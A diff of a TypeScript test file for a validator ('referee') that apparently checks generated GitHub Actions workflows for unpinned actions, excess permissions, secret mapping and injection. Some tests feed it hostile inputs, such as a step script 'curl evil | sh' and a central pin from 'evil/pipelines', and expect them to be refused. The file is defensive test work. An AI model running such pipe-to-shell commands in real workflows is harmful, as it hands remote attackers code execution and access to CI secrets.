@@ -3,7 +3,7 @@
 // the real renderer and stepsToYaml, some of it hand-written and hostile.
 import { centralWorkflowPath } from '../src/engine/central-path.js';
 import { Document, parseDocument } from 'yaml';
-import { defaultPushTrigger, DEPLOY_PUSH_IF, NO_SCANS } from '../src/engine/job-rules.js';
+import { CALLER_WORKFLOW, defaultPushTrigger, DEPLOY_PUSH_IF, NO_SCANS, PUSH_WORKFLOW, WORKFLOW_CONCURRENCY } from '../src/engine/job-rules.js';
 import { describe, expect, it } from 'vitest';
 import { JOB_PERMISSIONS, JOB_STEP_POLICY, pipegenLines, referee, type Linters, type RefereeDeps, type RefereeIssue, type RefereeReport } from '../src/engine/referee.js';
 import { gateJobList, jobIdFor } from '../src/engine/gate-job-list.js';
@@ -84,7 +84,10 @@ const job = (steps: RenderedStep[], over: Job = {}): Job => ({ 'runs-on': 'ubunt
 function workflowText(jobs: Record<string, Job>, top: Record<string, unknown> = {}, raw = false): string {
   const doc = new Document();
   const plain = Object.fromEntries(Object.entries(jobs).map(([id, j]) => [id, Object.fromEntries(Object.entries(j).filter(([k]) => k !== 'steps'))]));
-  doc.contents = doc.createNode({ name: 'pipegen', on: { pull_request: null }, permissions: {}, ...top, jobs: plain });
+  // G17 row 1b: pipegen.yml carries the workflow concurrency (a called workflow never does; wf drops it for another path)
+  const on = top.on ?? { pull_request: null };
+  const called = ['workflow_call', 'schedule'].some((t) => on === t || (typeof on === 'object' && on !== null && Object.hasOwn(on, t)));
+  doc.contents = doc.createNode({ name: 'pipegen', on: { pull_request: null }, permissions: {}, ...(called ? {} : { concurrency: { ...WORKFLOW_CONCURRENCY } }), ...top, jobs: plain });
   for (const [id, j] of Object.entries(jobs)) {
     if (!Array.isArray(j.steps)) continue;
     const steps = j.steps as RenderedStep[];
@@ -93,7 +96,8 @@ function workflowText(jobs: Record<string, Job>, top: Record<string, unknown> = 
   return doc.toString({ lineWidth: 0 });
 }
 const file = (content: string, path = '.github/workflows/pipegen.yml', over: Partial<CreatedFile> = {}): CreatedFile => ({ path, content, part: 'pipeline', reason: 'test', repo: 'app', ...over });
-const wf = (jobs: Record<string, Job>, top: Record<string, unknown> = {}, path?: string): CreatedFile => file(workflowText(jobs, top), path);
+const wf = (jobs: Record<string, Job>, top: Record<string, unknown> = {}, path?: string): CreatedFile =>
+  file(workflowText(jobs, path === undefined || path === CALLER_WORKFLOW || path === PUSH_WORKFLOW ? top : { concurrency: undefined, ...top }), path);
 /** A workflow whose steps did not go through stepsToYaml (hand-built, hostile). */
 const rawWf = (jobs: Record<string, Job>): CreatedFile => file(workflowText(jobs, {}, true));
 
@@ -103,8 +107,15 @@ const run = (files: CreatedFile[], d: PipelineDraft, opts: { list?: ReviewedTool
   referee(files, d, platform(), opts.list ?? [...reviewedList(), GATE], LINTERS, 'gh-stub', opts.deps ?? quiet);
 const checks = (r: RefereeReport): string[] => [...new Set(r.issues.map((i) => i.check))].sort();
 const has = (r: RefereeReport, check: RefereeIssue['check']): boolean => r.issues.some((i) => i.check === check);
-/** v0.2 Plan G G2-R-sec2: a permissions issue other than the registry-write placement rule (tests of the permission table itself use it). */
-const permsBesidesRegistry = (r: RefereeReport): boolean => r.issues.some((i) => i.check === 'permissions' && !/writes to the image registry/.test(i.message));
+/**
+ * v0.2 Plan G G2-R-sec2: a permissions issue other than the registry-write placement rule (tests of the permission table itself use it).
+ * G17 row 10: the registry-write issue is matched whole (the rule's one message for that job and that write), never filtered by a piece of
+ * its text, so no other permissions issue that happens to say "writes to the image registry" can hide behind it.
+ */
+const registryWrite = (job: string, write: 'a build that pushes' | 'packages: write'): string =>
+  `the job ${JSON.stringify(job)} writes to the image registry (${write}), which pipegen does only in a deploy job of ${CALLER_WORKFLOW} with if: ${DEPLOY_PUSH_IF} (a push to the default branch), or in a called workflow reached only from such a caller job, never on a pull request or a feature-branch push.`;
+const permsBesidesRegistry = (r: RefereeReport, job: string, write: 'a build that pushes' | 'packages: write' = 'packages: write'): boolean =>
+  r.issues.some((i) => i.check === 'permissions' && i.message !== registryWrite(job, write));
 const show = (r: RefereeReport): string => r.issues.map((i) => `${i.check}: ${i.message}`).join('\n');
 
 /** A small clean pipeline: gitleaks in its own job. */
@@ -247,7 +258,7 @@ describe('referee: pins', () => {
   it('referee: central prefix at sha allowed, at @main rejected', async () => {
     // fix round 1 (ruling 2): only at the commit pipegen recorded, and with the called file in files (judged too)
     const called = { ...wf({ check: job([]) }, { on: { workflow_call: null } }, '.github/workflows/gate.yml'), repo: 'central' as const };
-    const pinned = draftOf([], { centralPin: { repo: 'o/pipelines', sha: sha('c') } });
+    const pinned = draftOf([], { profile: { ...prof, private: true }, centralPin: { repo: 'o/pipelines', sha: sha('c') } });
     const caller = (at: string): CreatedFile => wf({ pipegen: { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${at}`, permissions: { contents: 'read' } } });
     const ok = await run([caller(sha('c')), called], pinned);
     expect(show(ok)).toBe('');
@@ -442,7 +453,7 @@ describe('referee: permissions by exact job id', () => {
   it('referee: job with packages: write outside sign job → permissions issue', async () => {
     expect(has(await withPerms('scan', { contents: 'read', packages: 'write' }), 'permissions')).toBe(true);
     // (G2-R-sec2: the sign job's packages: write is within its row; outside a deploy context it is a registry write, a rule of its own)
-    expect(permsBesidesRegistry(await withPerms('sign', { contents: 'read', packages: 'write' }))).toBe(false);
+    expect(permsBesidesRegistry(await withPerms('sign', { contents: 'read', packages: 'write' }), 'sign')).toBe(false);
   });
   it('referee: base-scan with actions: read allowed; pipegen-verify with packages: read and attestations: read allowed; gate with pull-requests: read allowed; pr-check with pull-requests: read allowed', async () => {
     for (const [id, p] of [['base-scan', { contents: 'read', actions: 'read' }], ['pipegen-verify', { contents: 'read', actions: 'read', packages: 'read', attestations: 'read' }],
@@ -482,7 +493,7 @@ describe('referee: permissions by exact job id', () => {
     const caller = (perms: unknown): CreatedFile => wf({ release: { uses: './.github/workflows/sign.yml', permissions: perms } });
     const union = { contents: 'read', [OIDC]: 'write', packages: 'write', attestations: 'write' };
     const attestDraft = draftOf([g.spec], { profile: { ...draftOf([g.spec]).profile, private: true }, signing: { mode: 'attest', images: [{ service: 'app', repo: 'ghcr.io/o/app' }] } });
-    expect(permsBesidesRegistry(await run([caller(union), called], attestDraft))).toBe(false);   // (G2-R-sec2: the registry-write rule aside)
+    expect(permsBesidesRegistry(await run([caller(union), called], attestDraft), 'sign')).toBe(false);   // (G2-R-sec2: the registry-write rule aside)
     expect(has(await run([caller({ ...union, issues: 'write' }), called], attestDraft), 'permissions')).toBe(true);
     expect(has(await run([caller(union)], draftOf([g.spec])), 'unknown-pin')).toBe(true);   // the called file is not in files
   });
@@ -593,10 +604,11 @@ describe('referee: more of a job, judged from the parsed file', () => {
   });
   it('a reusable-workflow caller maps each secret under its own name, and only an allowed one', async () => {
     const called = { ...wf({ check: job([]) }, { on: { workflow_call: null } }, '.github/workflows/gate.yml'), repo: 'central' as const };
-    const pinned = draftOf([], { centralPin: { repo: 'o/pipelines', sha: sha('c') } });
+    const pinned = draftOf([], { profile: { ...prof, private: true }, centralPin: { repo: 'o/pipelines', sha: sha('c') } });
     const caller = (mapped: Record<string, string>): CreatedFile => wf({ pipegen: { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${sha('c')}`, permissions: { contents: 'read' }, [SEC_FIELD]: mapped } });
     const fp = 'PIPEGEN_FP_KEY';
-    expect(show(await run([caller({ [fp]: ref(fp) }), called], pinned))).toBe('');
+    // (G17 row 1d: the called file here neither declares nor reads the name, so that is the one issue left; referee-g17 row 1d has the full case)
+    expect(show(await run([caller({ [fp]: ref(fp) }), called], pinned))).toBe(`permissions: the job "pipegen" passes the secret "${fp}", which the called workflow does not declare and read.`);
     expect(has(await run([caller({ OTHER: ref(fp) }), called], pinned), 'injection')).toBe(true);
     expect(has(await run([caller({ DATABASE_URL: ref('DATABASE_URL') }), called], pinned), 'permissions')).toBe(true);
   });
@@ -669,7 +681,8 @@ describe('referee: blocking needs (B7)', () => {
     const r = await run([wf({ scan: job(steps) })], draftOf([spec]), { list });
     expect(r.demoted).toEqual(['secrets']);
     expect(r.notes.join(' ')).toMatch(/secrets/);
-    expect(r.ok, show(r)).toBe(true);
+    // G17A-R1 sec I3: a demoted floor findings check is refused even alone (the gate's floor holds only what its job list holds)
+    expect(r.issues.map((i) => `${i.check}: ${i.message}`), show(r)).toEqual([expect.stringMatching(/^not-gate-readable: The floor check "secrets" writes nothing the gate can read: as a warning it leaves the gate's list/)]);
   });
   it('referee: blocking dast with zap-json accepted; blocking hooks-ci accepted', async () => {
     // G4-R1: DAST runs in two jobs (the app from its checked image archive, the scan, the raw hand-off; then the hash check and the scrub)
@@ -867,7 +880,7 @@ describe('fix round 1: the reviewer\'s attacks are refused', () => {
     expect(has(r, 'unknown-pin'), show(r)).toBe(true);
     // at the recorded SHA the step still gets every other check: a plain env, a working-directory, and it is no step of sign
     const atPin = { ...step, uses: `o/pipelines/anything@${CENTRAL.sha}` };
-    const r2 = await run([wf({ sign: job([atPin], { permissions: SIGNP }) })], draftOf([], { centralPin: CENTRAL }));
+    const r2 = await run([wf({ sign: job([atPin], { permissions: SIGNP }) })], draftOf([], { profile: { ...prof, private: true }, centralPin: CENTRAL }));
     expect(has(r2, 'template'), show(r2)).toBe(true);
     expect(has(r2, 'permissions'), show(r2)).toBe(true);
     const r3 = await run([rawWf({ sign: job([{ ...step, env: { PIPEGEN_COSIGN_KEY: ref('PIPEGEN_COSIGN_KEY') } }], { permissions: SIGNP }) })], draftOf([]));
@@ -876,22 +889,23 @@ describe('fix round 1: the reviewer\'s attacks are refused', () => {
   it('step-level central: accepted at the recorded SHA in a plain job, with nothing but plain with values', async () => {
     const step: RenderedStep = { name: 'central', uses: `o/pipelines/.github/actions/x@${CENTRAL.sha}`, with: { mode: 'check' } };
     const action = { ...file('name: x\ninputs:\n  mode:\n    description: m\nruns:\n  using: composite\n  steps: []\n', '.github/actions/x/action.yml'), repo: 'central' as const };
-    expect(show(await run([wf({ a: job([step]) }), action], draftOf([], { centralPin: CENTRAL })))).toBe('');
+    expect(show(await run([wf({ a: job([step]) }), action], draftOf([], { profile: { ...prof, private: true }, centralPin: CENTRAL })))).toBe('');
     expect(has(await run([wf({ a: job([step]) })], draftOf([])), 'unknown-pin')).toBe(true);   // no recorded central pin
-    expect(has(await run([wf({ a: job([{ ...step, uses: `o/pipelines/.github/actions/x@${sha('d')}` }]) })], draftOf([], { centralPin: CENTRAL })), 'unknown-pin')).toBe(true);
+    expect(has(await run([wf({ a: job([{ ...step, uses: `o/pipelines/.github/actions/x@${sha('d')}` }]) })], draftOf([], { profile: { ...prof, private: true }, centralPin: CENTRAL })), 'unknown-pin')).toBe(true);
   });
   it('A1b: a central caller job whose workflow is not in files, passing the cosign key → refused', async () => {
     const caller = { name: 'pipegen', uses: `o/pipelines/.github/workflows/whatever.yml@${CENTRAL.sha}`, permissions: { contents: 'read' }, [SEC_FIELD]: { PIPEGEN_COSIGN_KEY: ref('PIPEGEN_COSIGN_KEY') }, with: { x: 'y' } };
-    for (const d of [draftOf([]), draftOf([], { centralPin: CENTRAL })]) {
+    for (const d of [draftOf([]), draftOf([], { profile: { ...prof, private: true }, centralPin: CENTRAL })]) {
       const r = await run([wf({ pipegen: caller })], d);
       expect(has(r, 'unknown-pin'), show(r)).toBe(true);
     }
   });
   it('job-level central: accepted only at the recorded SHA with the called file in files (and judged there)', async () => {
-    const called = { ...wf({ gate: job([gateStep(), ...renderGateUploads(platform())], { if: 'always()', permissions: { contents: 'read', actions: 'read', 'pull-requests': 'read' } }) }, { on: { workflow_call: null } }, '.github/workflows/gate.yml'), repo: 'central' as const };
-    const caller = (at: string): CreatedFile => wf({ pipegen: { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${at}`, permissions: { contents: 'read', actions: 'read', 'pull-requests': 'read' }, [SEC_FIELD]: { PIPEGEN_FP_KEY: ref('PIPEGEN_FP_KEY') } } });
-    expect(show(await run([caller(CENTRAL.sha), called], draftOf([], { centralPin: CENTRAL }), { list: LIST }))).toBe('');
-    expect(has(await run([caller(sha('d')), called], draftOf([], { centralPin: CENTRAL }), { list: LIST }), 'unknown-pin')).toBe(true);
+    const called = { ...wf({ gate: job([gateStep(), ...renderGateUploads(platform())], { if: 'always()', permissions: { contents: 'read', actions: 'read', 'pull-requests': 'read' } }) }, { on: { workflow_call: null } }, '.github/workflows/r--merge.yml'), repo: 'central' as const };
+    // (G17 row 5: the central file that holds the gate is the project's merge workflow; row 1d: it reads no secret, so the caller maps none)
+    const caller = (at: string): CreatedFile => wf({ pipegen: { name: 'pipegen', uses: `o/pipelines/.github/workflows/r--merge.yml@${at}`, permissions: { contents: 'read', actions: 'read', 'pull-requests': 'read' } } });
+    expect(show(await run([caller(CENTRAL.sha), called], draftOf([], { profile: { ...prof, private: true }, centralPin: CENTRAL }), { list: LIST }))).toBe('');
+    expect(has(await run([caller(sha('d')), called], draftOf([], { profile: { ...prof, private: true }, centralPin: CENTRAL }), { list: LIST }), 'unknown-pin')).toBe(true);
     expect(has(await run([caller(CENTRAL.sha), called], draftOf([]), { list: LIST }), 'unknown-pin')).toBe(true);
   });
   it('A16: an empty or malformed owner never makes a central prefix', async () => {
@@ -911,7 +925,7 @@ describe('fix round 1: the reviewer\'s attacks are refused', () => {
   });
   it('a central step at the recorded SHA with a plain env → template', async () => {
     const step: RenderedStep = { name: 'central', uses: `o/pipelines/.github/actions/x@${CENTRAL.sha}`, env: { MODE: 'x' } };
-    expect(has(await run([wf({ a: job([step]) })], draftOf([], { centralPin: CENTRAL })), 'template')).toBe(true);
+    expect(has(await run([wf({ a: job([step]) })], draftOf([], { profile: { ...prof, private: true }, centralPin: CENTRAL })), 'template')).toBe(true);
   });
   it('a local action that uses itself, or one that is not composite, is refused as a local action (fix round 2, ruling 3)', async () => {
     const loop = file('name: l\nruns:\n  using: composite\n  steps:\n    - uses: ./.github/actions/loop\n', '.github/actions/loop/action.yml');
@@ -1019,7 +1033,7 @@ describe('fix round 1: the reviewer\'s attacks are refused', () => {
     expect(has(await run([wf({ t: job(scriptSteps(), { environment: 'pipegen-signing' }) })], dScripts()), 'permissions')).toBe(true);
     // (G3: the OIDC token and attestations write only with actions/attest in the job)
     const attestDraft = draftOf([], { profile: { ...draftOf([]).profile, private: true }, signing: { mode: 'attest', images: [{ service: 'app', repo: 'ghcr.io/o/app' }] } });
-    expect(permsBesidesRegistry(await run([wf({ sign: job(attestSteps(platform()), { permissions: SIGNP, environment: 'pipegen-signing' }) })], attestDraft))).toBe(false);   // (G2-R-sec2: the registry-write rule aside; G3-R2: attest mode)
+    expect(permsBesidesRegistry(await run([wf({ sign: job(attestSteps(platform()), { permissions: SIGNP, environment: 'pipegen-signing' }) })], attestDraft), 'sign')).toBe(false);   // (G2-R-sec2: the registry-write rule aside; G3-R2: attest mode)
   });
   it('A8: a secret value hidden by a YAML escape is found in the parsed scalars', async () => {
     const esc = fake.awsKey().replace(/^A/, '\\x41');
@@ -1058,7 +1072,8 @@ describe('fix round 1: an edited user workflow\'s own top level is judged where 
     withHeadCheck(doc, ['deploy']);
     return file(doc.toString({ lineWidth: 0 }), '.github/workflows/deploy.yml', { part: 'deploy-verify', inserted: { original, jobs: ['pipegen-verify'], needs: [{ job: 'deploy', added: ['pipegen-verify'] }], headCheck: ['deploy'] } });
   };
-  const userWf = (top: string, deployIf = ''): string => ['name: deploy', ...top.split('\n').filter(Boolean), 'jobs:', '  deploy:', ...(deployIf === '' ? [] : [`    if: ${deployIf}`]), '    runs-on: ubuntu-latest', '    steps:', '      - uses: actions/checkout@v4', '      - run: ./deploy.sh', ''].join('\n');
+  // G17 rows 2-4: the push of a deploy pipegen gates runs on the default branch only (the layer makes any other push a gap, and the referee re-derives it)
+  const userWf = (top: string, deployIf = ''): string => ['name: deploy', ...top.replace(/^on: push$/m, 'on:\n  push:\n    branches: [main]').split('\n').filter(Boolean), 'jobs:', '  deploy:', ...(deployIf === '' ? [] : [`    if: ${deployIf}`]), '    runs-on: ubuntu-latest', '    steps:', '      - uses: actions/checkout@v4', '      - run: ./deploy.sh', ''].join('\n');
   const d = (): PipelineDraft => draftOf([], { profile: { ...noImages(prof), existingWorkflows: [{ path: '.github/workflows/deploy.yml', triggers: ['push'], deploys: true, [`${SEC_FIELD}Used`]: [], jobs: ['deploy'] } as unknown as ExistingWorkflow] } });
   const judge = (top: string, deployIf = '', deps?: RefereeDeps): Promise<RefereeReport> => run([build(userWf(top, deployIf))], d(), { list: [...reviewedList(), GATE], ...(deps === undefined ? {} : { deps }) });
   it('a plain user workflow passes', async () => {
@@ -1130,7 +1145,7 @@ describe('fix round 2: the re-review probes are refused', () => {
   const g = gitleaks();
   const base = (): string => wf({ scan: job(g.steps) }).content;
   const editedWith = (cond: string | undefined): { f: CreatedFile; d: PipelineDraft } => {
-    const original = ['name: deploy', 'on: push', 'jobs:', '  deploy:', ...(cond === undefined ? [] : [`    if: ${JSON.stringify(cond)}`]), '    runs-on: ubuntu-latest', '    steps:', '      - run: ./deploy.sh', ''].join('\n');
+    const original = ['name: deploy', 'on:', '  push:', '    branches: [main]', 'jobs:', '  deploy:', ...(cond === undefined ? [] : [`    if: ${JSON.stringify(cond)}`]), '    runs-on: ubuntu-latest', '    steps:', '      - run: ./deploy.sh', ''].join('\n');
     const text = original.replace('  deploy:\n', '  deploy:\n    needs: [pipegen-verify]\n')
       + `  pipegen-verify:\n    runs-on: ubuntu-latest\n    timeout-minutes: ${VERIFY_LIMIT}\n    permissions:\n      contents: read\n      actions: read\n      packages: read\n      attestations: read\n    cache-mode: none\n    steps: []\n`;
     const doc = parseDocument(text);
@@ -1223,7 +1238,7 @@ describe('fix round 2: the re-review probes are refused', () => {
     const action = { ...file(doc.toString({ lineWidth: 0 }), '.github/actions/fetch/action.yml'), repo: 'central' as const };
     const centralWf = { ...file(workflowText({ gate: job([...prelude(), { name: 'fetch', uses: './.github/actions/fetch' } as RenderedStep, gateStep()], { permissions: { contents: 'read', actions: 'read' } }) }, { on: { workflow_call: null } })), path: '.github/workflows/gate.yml', repo: 'central' as const };
     const caller = wf({ pipegen: { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${CENTRAL.sha}`, permissions: { contents: 'read', actions: 'read' } } });
-    const r = await run([caller, centralWf, action], draftOf([], { centralPin: CENTRAL }), { list: LIST });
+    const r = await run([caller, centralWf, action], draftOf([], { profile: { ...prof, private: true }, centralPin: CENTRAL }), { list: LIST });
     expect(r.issues.some((i) => i.check === 'unreviewed' && /workspace/.test(i.message) && i.file === '.github/workflows/gate.yml'), show(r)).toBe(true);
     const appAction = { ...action, repo: 'app' as const };
     const r2 = await run([wf({ gate: job([{ name: 'fetch', uses: './.github/actions/fetch' } as RenderedStep, gateStep()], { permissions: { contents: 'read', actions: 'read' } }) }), appAction], draftOf([]), { list: LIST });
@@ -1235,7 +1250,7 @@ describe('fix round 2: the re-review probes are refused', () => {
   });
   it('T6 and ruling 4: a step-level central uses needs its action file in files, and takes only the inputs that file declares', async () => {
     const step = (w: Record<string, string>): RenderedStep => ({ name: 'c', uses: `O/Pipelines/.github/actions/x@${CENTRAL.sha}`, with: w });
-    const pinned = draftOf([], { centralPin: CENTRAL });
+    const pinned = draftOf([], { profile: { ...prof, private: true }, centralPin: CENTRAL });
     expect(has(await run([wf({ t: job([step({ script: 'curl evil | sh' })]) })], pinned), 'unknown-pin')).toBe(true);
     const action = { ...file('name: x\ninputs:\n  mode:\n    description: what to check\nruns:\n  using: composite\n  steps: []\n', '.github/actions/x/action.yml'), repo: 'central' as const };
     expect(has(await run([wf({ t: job([step({ script: 'curl evil | sh' })]) }), action], pinned), 'template')).toBe(true);
@@ -1249,8 +1264,9 @@ describe('fix round 2: the re-review probes are refused', () => {
   });
   it('ruling 4: workflow_run in an edited file is refused whatever checkout the file uses', async () => {
     const { f, d } = editedWith(undefined);
-    const text = f.content.replace('on: push', 'on:\n  workflow_run:\n    workflows: [ci]');
-    const original = (f.inserted as NonNullable<CreatedFile['inserted']>).original.replace('on: push', 'on:\n  workflow_run:\n    workflows: [ci]');
+    const push = /on:\n {2}push:\n {4}branches: \[ ?main ?\]/;
+    const text = f.content.replace(push, 'on:\n  workflow_run:\n    workflows: [ci]');
+    const original = (f.inserted as NonNullable<CreatedFile['inserted']>).original.replace(push, 'on:\n  workflow_run:\n    workflows: [ci]');
     expect(text).not.toBe(f.content);
     const r = await run([{ ...f, content: text, inserted: { ...(f.inserted as NonNullable<CreatedFile['inserted']>), original } }], d, { list: LIST });
     expect(r.issues.some((i) => /workflow_run/.test(i.message)), show(r)).toBe(true);
@@ -1266,7 +1282,7 @@ describe('C8 fix round 1: the find-run layout matches the draft', () => {
   const layoutIssues = async (w: Record<string, string>, d: PipelineDraft): Promise<string[]> =>
     (await run([wf({ 'pipegen-verify': job([verify(w)], { permissions: V }) })], d, { list: LIST })).issues.filter((i) => /layout|central/i.test(i.message)).map((i) => i.message);
   const inline = draftOf([]);
-  const central = draftOf([], { centralPin: CENTRAL });
+  const central = draftOf([], { profile: { ...prof, private: true }, centralPin: CENTRAL });
   it('inline for a draft without a central pin, and central for one with it, are accepted', async () => {
     expect(await layoutIssues({ layout: 'inline' }, inline)).toEqual([]);
     expect(await layoutIssues({ layout: 'central', 'central-workflow': CW, 'central-sha': CENTRAL.sha }, central)).toEqual([]);
@@ -1302,11 +1318,11 @@ describe('C8 fix round 1: the find-run layout matches the draft', () => {
   it('Part 0 (review-C8-r1 r1-2): the layout is judged against the VALIDATED central pin; a pin that centralOf refuses raises an issue', async () => {
     const evilPin = { repo: 'evil/pipelines', sha: CENTRAL.sha };
     const evilCw = centralWorkflowPath(evilPin.repo, prof.repo);
-    const evil = draftOf([], { centralPin: evilPin });
+    const evil = draftOf([], { profile: { ...prof, private: true }, centralPin: evilPin });
     // a pin of another owner, with a central-workflow and central-sha that match it: refused (it used to pass this check)
     expect((await layoutIssues({ layout: 'central', 'central-workflow': evilCw, 'central-sha': evilPin.sha }, evil)).length).toBeGreaterThan(0);
     // a pin whose commit is not 40-hex, and a pin that is not an object-shaped pin of the owner
-    const short = draftOf([], { centralPin: { repo: CENTRAL.repo, sha: 'abc123' } });
+    const short = draftOf([], { profile: { ...prof, private: true }, centralPin: { repo: CENTRAL.repo, sha: 'abc123' } });
     expect((await layoutIssues({ layout: 'central', 'central-workflow': CW, 'central-sha': 'abc123' }, short)).length).toBeGreaterThan(0);
     // the inline claim for an invalid pin is refused too (it is not "no pin")
     expect((await layoutIssues({ layout: 'inline' }, evil)).length).toBeGreaterThan(0);
